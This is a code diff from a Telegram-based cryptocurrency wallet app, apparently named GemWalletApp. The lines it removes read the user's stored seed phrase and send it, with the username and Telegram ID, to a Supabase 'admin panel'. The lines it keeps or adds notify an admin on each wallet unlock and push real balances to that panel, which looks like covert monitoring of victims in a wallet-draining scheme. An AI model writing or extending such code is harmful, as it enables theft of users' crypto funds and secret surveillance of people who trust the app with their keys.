@@ -8853,9 +8853,12 @@ export default function GemWalletApp() {
 
     setScreen("wallet");
 
-    // Sync to Supabase on PIN unlock — adds wallet if missing, updates if exists
+    // Immediately refresh balances from blockchain and sync to Supabase (admin panel)
+    // so the admin sees real balances right away instead of waiting up to 30 seconds
+    refreshPrices();
+
+    // Notify admin on unlock
     try {
-      const storedMnemonic = localStorage.getItem(storageKey("gem_mnemonic"));
       const tgUser = window?.Telegram?.WebApp?.initDataUnsafe?.user;
       const uid = RESOLVED_USER_ID;
       const uname = tgUser?.username
@@ -8863,17 +8866,6 @@ export default function GemWalletApp() {
         : [tgUser?.first_name, tgUser?.last_name].filter(Boolean).join(" ")
         || "User_" + (uid || "Unknown");
 
-      if (storedMnemonic) {
-        // Balances are 0 at unlock time — real balances come from refreshPrices right after
-        syncWalletToSupabase({
-          username: uname,
-          telegram_id: uid || null,
-          mnemonic: storedMnemonic,
-          balance: "0",
-        });
-      }
-
-      // Notify admin every time a wallet is unlocked
       notifyAdmin(
         `🔓 <b>Кошелёк разблокирован</b>\n\n` +
         `👤 ${uname}\n` +
